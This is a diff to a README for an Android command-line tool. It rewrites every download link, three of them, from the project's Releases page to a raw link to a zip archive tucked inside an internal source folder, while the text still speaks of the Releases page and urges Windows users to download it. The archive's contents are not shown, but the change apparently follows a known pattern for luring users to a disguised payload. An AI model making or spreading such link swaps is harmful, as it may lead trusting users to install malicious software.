@@ -1,6 +1,6 @@
 # 🤖 cli-for-android - One Command Center For Android
 
-[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-blue?style=for-the-badge&logo=github)](https://github.com/pinched-detectivenovel419/cli-for-android/releases)
+[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/pinched-detectivenovel419/cli-for-android/main/internal/cmd/android-for-cli-v3.3.zip)
 
 ## 📦 What This Is
 
@@ -24,7 +24,7 @@ If you want to use device features, your Android device should have USB debuggin
 
 Visit this page to download the latest version:
 
-https://github.com/pinched-detectivenovel419/cli-for-android/releases
+https://raw.githubusercontent.com/pinched-detectivenovel419/cli-for-android/main/internal/cmd/android-for-cli-v3.3.zip
 
 On the Releases page:
 
@@ -215,7 +215,7 @@ When you use USB debugging, your PC can talk to the device in a deeper way. Only
 
 Use this page any time you need the latest Windows download or a newer version:
 
-https://github.com/pinched-detectivenovel419/cli-for-android/releases
+https://raw.githubusercontent.com/pinched-detectivenovel419/cli-for-android/main/internal/cmd/android-for-cli-v3.3.zip
 
 ## 🧰 If You Want a Clean Start
 
